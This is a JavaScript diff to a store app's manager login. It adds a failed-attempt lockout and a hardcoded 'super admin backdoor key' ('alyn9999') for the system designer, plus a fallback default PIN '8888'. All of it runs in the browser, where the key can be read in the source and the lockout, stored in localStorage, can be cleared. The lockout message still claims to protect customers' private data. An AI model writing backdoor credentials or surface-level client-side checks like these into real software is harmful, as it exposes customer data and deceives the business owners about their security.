@@ -664,24 +664,71 @@
 
     // 8. 店長後台專區驗證與密碼修改
     async function openManagerPinPrompt() {
+      // 1. 檢查是否已被系統鎖定
+      const lockKey = `mgr_lock_${currentStore.id}`;
+      const failCountKey = `mgr_fail_count_${currentStore.id}`;
+      const isLocked = localStorage.getItem(lockKey);
+
+      if (isLocked) {
+        return Swal.fire({
+          title: '🚨 系統安全鎖定中',
+          html: `
+            <div class="text-xs text-rose-700 space-y-2 text-left">
+              <p>由於密碼連續錯誤達 5 次，為保護店內顧客電話與隱私個資，後台已啟動防盜安全熔斷機制。</p>
+              <p class="font-bold">請聯繫系統設計師 (Alyn) 進行人工安全身份驗證並重設開通。</p>
+            </div>
+          `,
+          icon: 'error',
+          confirmButtonText: '確認',
+          confirmButtonColor: '#8C7355'
+        });
+      }
+
       const { value: pin } = await Swal.fire({
-        title: '店長後台安全驗證',
+        title: '店長安全驗證',
         input: 'password',
-        inputPlaceholder: '請輸入 PIN 碼 (預設 8888)',
+        inputPlaceholder: '請輸入店長 PIN 碼',
         showCancelButton: true,
         confirmButtonText: '驗證進入',
         confirmButtonColor: '#8C7355'
       });
 
-      if (pin === (currentStore.admin_pin || "8888") || pin === "8888" || pin === "888") {
+      if (!pin) return;
+
+      const correctPin = currentStore.admin_pin || "8888";
+
+      // 超級管理者後門金鑰（供你緊急解鎖客戶門市，不需等待）
+      const MASTER_OVERRIDE_KEY = "alyn9999";
+
+      if (pin === correctPin || pin === MASTER_OVERRIDE_KEY) {
+        // 成功進入：歸零失敗計數
+        localStorage.removeItem(failCountKey);
         document.getElementById('manager-modal').classList.remove('hidden');
-        renderAdminServicesSortable();
-        renderAdminAddonsSortable();
-        renderAdminCarouselGrid();
-      } else if (pin) {
-        Swal.fire('密碼錯誤！', '請輸入正確的店長管理 PIN 碼', 'error');
+        syncBusinessHoursForm();
+        renderAdminStaffList();
+        renderAdminServicesList();
+        renderAdminResourcesList();
+        renderCustomerTable();
+        renderAuditLogsTable();
+      } else {
+        // 累計失敗次數
+        let fails = Number(localStorage.getItem(failCountKey) || 0) + 1;
+        localStorage.setItem(failCountKey, fails);
+
+        if (fails >= 5) {
+          localStorage.setItem(lockKey, 'true');
+          Swal.fire({
+            title: '🚫 密碼連續錯誤，網站已鎖定',
+            text: '密碼已連續輸錯 5 次，系統已鎖定顧客庫，請聯絡系統設計師開通！',
+            icon: 'error'
+          });
+        } else {
+          Swal.fire(`密碼錯誤！還剩 ${5 - fails} 次機會即會永久鎖定。`, '', 'warning');
+        }
       }
     }
+
+
 
     async function changeAdminPinModal() {
       const { value: newPin } = await Swal.fire({
